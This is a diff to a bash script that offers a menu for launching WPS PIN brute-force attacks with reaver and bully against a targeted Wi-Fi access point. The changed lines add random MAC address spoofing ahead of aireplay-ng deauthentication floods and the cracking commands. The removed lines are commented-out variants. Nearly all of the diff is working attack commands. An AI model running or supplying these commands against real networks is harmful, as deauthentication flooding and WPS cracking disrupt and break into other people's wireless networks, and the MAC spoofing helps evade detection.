@@ -31,22 +31,16 @@ do
     case $opt in
         "Reaver")
             echo "Reaver Attack Launching"
-          aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1 | reaver -i $interface -b $tmac -c $channel -                                                                                                                          vv -K -JSLw;;
+          ifconfig $interface hw ether $(printf '02:%02X:%02X:%02X:%02X:%02X \n' $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256]) | aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1 | reaver -i $interface -b $tmac -c $channel -vv -K -JSLw;;
         "Bully")
             echo "Bully Attack Launching"
-            aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1 |  bully $interface -b $tmac -e $bname -c$c                                                                                                                          hannel -dBW -v 3;;
+          ifconfig $interface hw ether $(printf '02:%02X:%02X:%02X:%02X:%02X \n' $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256]) | aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1 |  bully $interface -b $tmac -e $bname -c$channel -dBW -v 3;;
         "Quit")
             break
             ;;
         *) echo invalid option;;
     esac
-# Reaver
-#reaver -i $interface -b $tmac -c $channel -vvv -K -t 10 -f
-#echo "Reaver attack finised"
-# Bully
-#bully $interface -b $tmac -e $bname -c $channel -dFW
-#echo "Bully attack finished"
-# ADDED ABOVE TO A SELECT MENU TO AVOID DDOS'n MY ROUTER
+#1337
 echo "If that didnt work, Well, We tried!"
 echo "If this failed, you may have used incorrect information, or the AP is not vulernable (WPS)"
 done
